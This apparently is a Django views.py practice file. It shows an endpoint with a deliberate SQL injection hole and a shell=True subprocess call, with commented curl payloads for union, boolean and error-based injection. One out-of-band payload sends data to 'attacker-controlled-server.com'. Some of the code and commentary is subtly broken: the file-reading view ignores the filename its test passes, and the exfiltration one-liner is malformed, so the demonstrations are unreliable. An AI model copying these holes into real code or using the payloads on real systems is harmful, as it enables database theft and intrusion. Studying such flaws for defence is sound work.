# views.py

from django.http import JsonResponse
from django.db import connection


#in band sql injection
def get_user_data(request):
    username = request.GET.get('username')
    query = f"SELECT id, username, email FROM auth_user WHERE username = '{username}';"
    with connection.cursor() as cursor:
        cursor.execute(query)
        result = cursor.fetchone()

    if result:
        return JsonResponse({'data': result})
    else:
        return JsonResponse({'message': 'User not found.'})

#test : curl "http://localhost:8000/get_user_data/?username=' OR 1=2 --" = it will always return false 
# curl "http://localhost:8000/get_user_data/?username=' OR 1=1 --" : this is the real condition

#error based sql 
# def get_user_data(request):
#     username = request.GET.get('username')
#     #This query includes 1/0, which would trigger a division by zero error.
#     query = f"SELECT id, username, email FROM auth_user WHERE username = '{username}' AND 1/0;"

#     with connection.cursor() as cursor:
#         try:
#             cursor.execute(query)
#             result = cursor.fetchone()

#             if result:
#                 return JsonResponse({'data': result})
#             else:
#                 return JsonResponse({'message': 'User not found.'})

#         except Exception as e:
#             return JsonResponse({'message': f'Error: {e}'})
    
#test : $credential = Get-Credential -Credential admin / Invoke-RestMethod -Uri "http://localhost:8000/get_user_data/?username=admin' AND 1=1; --" -Method Get -Credential $credential
# the query executed successfully, and the user data was retrieved

#union sql injection
# test this : curl "http://localhost:8000/get_user_data/?username=testuser' UNION SELECT 1, 'attacker', 'attacker@example.com' --"

#output : JSON: {"data": [1, "attacker", "attacker@example.com"]}

# in blind sql injection :
# test : curl "http://localhost:8000/get_user_data/?username=admin' OR '1'='1' --"
# output : {"data": [1, "admin", "admin@gmail.com"]}
# boolean sql injection ::
# test: curl "http://localhost:8000/get_user_data/?username=admin' OR '1'='1' --"
#out of band :  allows the application to communicate with an external system controlled by the attacker
#test : # Assume this payload triggers an out-of-band SQLi that sends data to the external server
#http://attacker-controlled-server.com : domaine of an attacker 
#curl "http://attacker-controlled-server.com/log?data=$(curl 'http://vulnerable-app.com/get_user_data/?username=admin'; SELECT * FROM users; --')"


#OS Command Injection :


import subprocess
from django.http import JsonResponse

def read_file(request):

    filename =r'C:\example os command\command.txt'

    try:
        # Using 'type' command in Windows to read a file
        result = subprocess.check_output(f'type "{filename}"', shell=True, text=True)
        return JsonResponse({'output': result})
    except Exception as e:
        return JsonResponse({'message': f'Error: {e}'})

#test : curl "http://localhost:8000/read_file/?filename=C:/example%20os%20command.txt"